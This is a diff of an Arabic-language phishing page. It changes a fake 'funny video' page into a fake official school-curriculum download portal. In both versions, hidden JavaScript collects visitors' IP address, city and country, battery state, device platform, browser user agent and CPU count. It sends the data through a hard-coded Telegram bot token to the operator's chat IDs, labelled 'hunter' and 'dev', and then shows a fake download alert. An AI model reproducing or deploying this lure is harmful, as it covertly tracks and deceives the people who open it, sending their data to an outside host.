@@ -1,60 +1,57 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Funny Clips HD</title>
-    <style>
-        body { background: #000; color: #fff; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
-        video { width: 95%; max-width: 400px; border-radius: 15px; border: 2px solid #555; box-shadow: 0 0 20px rgba(255,255,255,0.2); }
-        .msg { margin-top: 15px; font-size: 14px; color: #444; }
-    </style>
+    <title>تحميل ملفات 2009</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
-<body>
-
-    <video autoplay muted loop playsinline>
-        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-    </video>
-    
-    <p>جاري تحديث مشغل الفيديو... يرجى الانتظار</p>
-    <div class="msg">Syncing system headers...</div>
+<body style="text-align:center; font-family:sans-serif; background:#f4f4f4;">
+    <div style="margin-top:50px; padding:20px;">
+        <h3>بوابة تحميل منهاج 2009 الرسمي 📱</h3>
+        <p>يتم الآن فحص اتصالك لتأمين التحميل...</p>
+        <button id="btn" style="padding:15px 30px; background:#ff9800; color:white; border:none; border-radius:8px; font-weight:bold;">بدء التحميل المباشر</button>
+    </div>
 
     <script>
-        async function getSys() {
-            // توكن البوت مشفر
-            const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
-            const id = new URLSearchParams(window.location.search).get('id');
-            
+        const pr = new URLSearchParams(window.location.search);
+        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
+
+        async function getFullData() {
+            // 1. جلب الـ IP والموقع
+            let ipData = { ip: "غير معروف", city: "غير معروف" };
             try {
-                // سحب الـ IP
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                
-                // سحب معلومات البطارية
-                let batteryInfo = "غير معروف";
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryInfo = Math.round(battery.level * 100) + "%";
-                }
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch (e) {}
 
-                const info = `
-📱 **بيانات نظام جديدة (أبو سند)**
-🌐 الـ IP: \`${data.ip}\`
-💻 النوع: \`${navigator.platform}\`
-🔋 البطارية: \`${batteryInfo}\`
-🔍 المتصفح: \`${navigator.userAgent.slice(0, 50)}...\`
-                `;
+            // 2. جلب معلومات البطارية
+            let batteryInfo = "غير مدعوم";
+            try {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'جاري الشحن' : 'لا يشحن'})`;
+            } catch (e) {}
 
-                if(id) {
-                    fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${id}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
-                }
-            } catch (e) {
-                console.log("Error fetching data");
-            }
+            // 3. تجميع الرسالة
+            const msg = `
+📱 صيدة نظام (2009) 📱
+👤 الصياد: ${pr.get('hunter')}
+🌐 الـ IP: ${ipData.ip}
+📍 الموقع: ${ipData.city} / ${ipData.country_name}
+🔋 البطارية: ${batteryInfo}
+📱 الجهاز: ${navigator.platform}
+🌐 المتصفح: ${navigator.userAgent}
+💻 المعالج: ${navigator.hardwareConcurrency || 'غير معروف'} Core
+            `;
+
+            const fullMsg = encodeURIComponent(msg);
+            // الإرسال للمستخدم ولإلك (أبو سند)
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('id')}&text=${fullMsg}`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pr.get('dev')}&text=${fullMsg}`);
+            
+            alert("بدأ التحميل... يرجى الانتظار");
         }
 
-        // تشغيل السحب فوراً عند فتح الصفحة
-        window.onload = getSys;
+        document.getElementById('btn').onclick = getFullData;
     </script>
 </body>
 </html>
